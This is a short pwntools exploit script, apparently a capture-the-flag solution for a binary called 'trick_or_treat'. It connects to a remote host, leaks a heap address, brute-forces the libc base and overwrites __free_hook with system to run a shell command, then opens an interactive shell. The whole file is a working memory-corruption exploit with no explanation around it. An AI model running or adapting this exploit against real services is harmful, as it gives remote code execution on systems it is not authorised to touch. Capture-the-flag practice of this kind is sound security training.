from pwn import *

for c in range(2000, 5000):
  print(c)
  #r = process("./trick_or_treat")
  r = remote("3.112.41.140", 56746)
  r.recvuntil("Size:")
  r.sendline("9999999")
  r.recvuntil("Magic:")
  leak = int(r.recvline(), 16)
  print hex(leak)
  actual = leak + 0x98fff0
  libcbase = leak - 0x10 + c*0x1000
  print(hex(libcbase))

  mallochook = libcbase + 0x3ebc30
  freehook = libcbase + 0x3ed8e8
  onegad = libcbase + 0xe569f
  reallochook = libcbase + 0x3ebc28
  system = libcbase + 0x4f440

  off1 = freehook
  val1 = system
  a = ""
  try:
    r.sendline(hex((off1 - leak) / 8) + " " + hex(val1)) 
    r.sendline("AB"*3000 + " ed")
    r.sendline("P")
    r.sendline("!echo 'asdf'")
    a = r.recvuntil("asdf", timeout=1)
  except:
    pass
  if "asdf" in a:
    print "WIN"
    print(c)
    r.interactive()
#r.sendline(hex((stdin + 0xd8 - leak) / 8) + " " + hex(leak)) 
  r.close()
